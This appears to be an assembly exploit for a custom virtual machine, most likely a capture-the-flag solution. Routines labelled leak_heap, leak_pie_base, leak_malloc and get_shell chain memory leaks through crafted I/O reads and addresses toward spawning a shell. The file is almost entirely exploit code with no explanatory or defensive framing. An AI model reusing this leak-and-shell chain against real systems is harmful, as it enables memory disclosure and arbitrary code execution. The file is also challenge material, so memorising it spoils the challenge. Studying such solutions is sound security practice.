.section .io, RWE
__IO_BASE:

.section .text, E
.dupb 0, 0x3cb


leak_heap:
	pushcf 0x21
	storeq f, __IO_BASE + 16 // READ_SIZE
	pushcf 0x8000000fff
	storeq f, __IO_BASE + 8 // READ_BUF
	call __read_polling
	pushcf 0x909090909090b048 // this leaks the heap
	loadq f
	pushrf
	call __write_qword
	call dbg
	call dbg
	call dbg
	call dbg

leak_pie_base:
	// lock the segment to setup callback
	pushcf 0x1
	storeq f, __IO_BASE + 16 // READ_SIZE
	pushcf 0xa0a0a0a0a0a0a001
	storeq f, __IO_BASE + 8 // READ_BUF

	pushcf 0x909090909090b028 // seg->cb1
	loadq f
	pushrf
	call __read_polling
	call __write_qword
	call dbg
	call dbg
	call dbg
	call dbg

map_binary:
	pushcf 0x51
	storeq f, __IO_BASE + 16 // READ_SIZE
	pushcf 0x8000000fff
	storeq f, __IO_BASE + 8 // READ_BUF
	call __read_polling

leak_malloc:
	pushcf 0
	loadq f
	pushrf
	call __write_qword
	call dbg
	call dbg
	call dbg
	call dbg

get_shell:
	pushcf 0x51
	storeq f, __IO_BASE + 16 // READ_SIZE
	pushcf 0x8000000fff
	storeq f, __IO_BASE + 8 // READ_BUF
	call __read_polling
	pushcf 0
	loadq f
halt


__write_qword:
	pushrb
	popf

	pushrf
	pushrf // Q: i, i
	storeb f, __IO_BASE
	pushcb 8
	shr f, b

	pushrf
	pushrf // Q: i, i
	storeb f, __IO_BASE
	pushcb 8
	shr f, b

	pushrf
	pushrf // Q: i, i
	storeb f, __IO_BASE
	pushcb 8
	shr f, b

	pushrf
	pushrf // Q: i, i
	storeb f, __IO_BASE
	pushcb 8
	shr f, b

	pushrf
	pushrf // Q: i, i
	storeb f, __IO_BASE
	pushcb 8
	shr f, b

	pushrf
	pushrf // Q: i, i
	storeb f, __IO_BASE
	pushcb 8
	shr f, b

	pushrf
	pushrf // Q: i, i
	storeb f, __IO_BASE
	pushcb 8
	shr f, b

	pushrf
	storeb f, __IO_BASE
	retb

__read_polling:
  pushrb
__loop:
  pushcf __IO_BASE + 0x20     // err
  loadq f
  pushcb 0
  eq b, r   // err == 0 ?
  pushrb
  jz b, __loop
  retb

dbg:
  pushcf 0x41
  storeb f, __IO_BASE
  retr
